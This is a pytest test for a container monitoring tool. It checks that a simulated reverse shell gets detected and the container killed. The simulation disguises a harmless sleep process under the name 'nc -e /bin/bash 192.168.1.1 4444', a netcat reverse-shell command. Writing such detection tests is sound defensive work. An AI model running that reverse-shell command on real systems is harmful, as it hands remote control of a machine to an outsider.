"""Test threat detection for different attack types."""

import subprocess
import time
from pathlib import Path

import pytest

from support.monitoring import (
    cleanup_container,
    container_absent,
    get_container_name_from_workspace,
    get_container_state,
    get_threat_events,
)


def test_reverse_shell_detection(test_workspace, enable_monitoring, coi_binary):
    """Test reverse shell detection and auto-kill."""
    # Capture stderr to debug file to see monitoring logs
    stderr_file = Path("/tmp") / "coi-test-debug.log"
    stderr_fd = open(stderr_file, "w")  # noqa: SIM115 - need to keep open for subprocess

    # Start shell in background (don't read stdout/stderr to avoid blocking)
    proc = subprocess.Popen(
        [coi_binary, "shell", "--workspace", test_workspace, "--slot", "1", "--debug"],
        stdin=subprocess.DEVNULL,  # Don't interact
        stdout=subprocess.DEVNULL,  # Ignore output
        stderr=stderr_fd,  # Capture stderr for debugging
    )

    # Wait for container to be created and running (may take longer on first run
    # when the image is not yet cached)
    container_name = get_container_name_from_workspace(test_workspace)
    ready = False
    for _ in range(30):
        time.sleep(1)
        state = get_container_state(container_name)
        if state == "Running":
            ready = True
            break

    if not ready:
        proc.terminate()
        stderr_fd.close()
        pytest.skip(f"Container {container_name} not ready, state: {state}")

    # Inject malicious command (simulate reverse shell)
    subprocess.Popen(
        [
            "incus",
            "exec",
            container_name,
            "--",
            "bash",
            "-c",
            "exec -a 'nc -e /bin/bash 192.168.1.1 4444' sleep 30",
        ],
        stdout=subprocess.DEVNULL,
        stderr=subprocess.DEVNULL,
    )

    # Wait for monitoring to detect and kill
    killed = False
    for _ in range(15):
        time.sleep(1)
        state = get_container_state(container_name)
        if container_absent(container_name):
            killed = True
            break

    # Close stderr file and print contents for debugging (before assertions)
    proc.terminate()
    stderr_fd.close()

    # Print debug log for CI visibility (BEFORE assertions so we see it even on failure)
    print("\n=== Coi Debug Log ===")
    if stderr_file.exists():
        print(stderr_file.read_text())
    print("=== End Debug Log ===\n")

    # Verify container was killed
    assert killed, f"Expected container killed, got {state}"

    # Verify threat event logged
    events = get_threat_events(container_name)
    critical = [e for e in events if e.get("level") == "critical"]
    assert len(critical) > 0, f"Expected CRITICAL threat event, found {len(critical)}"

    cleanup_container(container_name, coi_binary)
